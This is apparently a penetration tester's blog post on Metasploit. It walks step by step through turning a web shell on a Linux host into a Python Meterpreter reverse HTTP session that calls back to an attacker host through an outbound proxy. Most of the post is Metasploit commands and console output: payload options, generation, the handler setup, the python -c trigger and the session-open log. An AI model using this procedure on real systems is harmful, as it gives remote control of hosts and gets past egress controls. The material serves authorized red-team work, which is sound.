# Metasploit - Python Meterpreter through Proxy

I recently got into a situation where I had a web shell on a Linux system and wanted to get a full Meterpreter. Initially, we thought there was no outbound access, but a fellow teammate discovered a proxy server after reverse engineering some .jar files found on the system. Now I needed a reverse shell that allowed me to specify a proxy for outbound connections. I sent a quick message to @TheColonial on IRC, and he let me know that Python HTTP/HTTPS Meterpreters could do what I needed.

## Testing Python on the webshell

First I used the web shell to test the ability to run Python

```python -c "import os;os.system('ls')"```

## Generating the payload

When this worked I moved onto generating the meterpreter payload:

```msf > use payload/python/meterpreter/reverse_http```

Next I set my attack host IP address and the IP address of the outbound proxy:

```
msf payload(reverse_http) > show options

Module options (payload/python/meterpreter/reverse_http):

   Name              Current Setting            Required  Description
   ----              ---------------            --------  -----------
   LHOST             *attack host ip*           yes       The local listener hostname
   LPORT             80                         yes       The local listener port
   LURI                                         no        The HTTP Path
   PayloadProxyHost  *outbound proxy*           no        The proxy server's IP address
   PayloadProxyPort  80                         yes       The proxy port to connect to
```

Last step was to generate the payload:

```
msf payload(reverse_http) > generate -b '\x00\xff' -t raw -f meterp-python-https-80.py
[*] Writing 606 bytes to meterp-python-http-80.py...
```

This will generate a one liner that you can use to trigger the payload.

## Setting up the Handler

The next step is to setup the handler:
```
msf payload(reverse_http) > use exploit/multi/handler
```

Then I set the handler payload option:
```
msf exploit(handler) > set payload python/meterpreter/reverse_http
payload => python/meterpreter/reverse_http
```

Followed by the other needed options:

```
msf exploit(handler) > set LHOST *attack host ip*
LHOST => *attack host ip*
msf exploit(handler) > set LPORT 80
LPORT => 80
msf exploit(handler) > set PayloadProxyHost *outbound proxy*
PayloadProxyHost => *outbound proxy*
msf exploit(handler) > set Payloadproxyport 80
Payloadproxyport => 80
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (python/meterpreter/reverse_http):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   LHOST             *attack host ip* yes       The local listener hostname
   LPORT             80               yes       The local listener port
   LURI                               no        The HTTP Path
   PayloadProxyHost  *outbound proxy* no        The proxy server's IP address
   PayloadProxyPort  80               yes       The proxy port to connect to


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
   
```
I set a few additional options, such as ExitOnSession, to false so the handler remains open for multiple connections in case the first one fails. Also, I set verbose to true to get more verbose output for troubleshooting:

```
msf exploit(handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(handler) > set VERBOSE true
verbose => true
```

Lastly, I start the handler with exploit -j, so it runs in the background:

```
msf exploit(handler) > exploit -j
[*] Exploit running as background job.
```

## Triggering the payload

Next take the payload one-liner that was generated and use python -c to trigger the payload in your web shell(Other forms of command execution could be potentially used to do this as well):

```
python -c "*python meterpreter one liner*"
```

And wait for the payload to stage:

```
[*] http://*attack host*:80 handling request from *outbound proxy*; (UUID: 6dvezhby) Staging Python payload...
[*] Meterpreter session 1 opened (*victim*:80 -> *outbound proxy*:12480) at 2016-10-05 00:12:02 +0000
```

Enjoy your Meterpreter :)
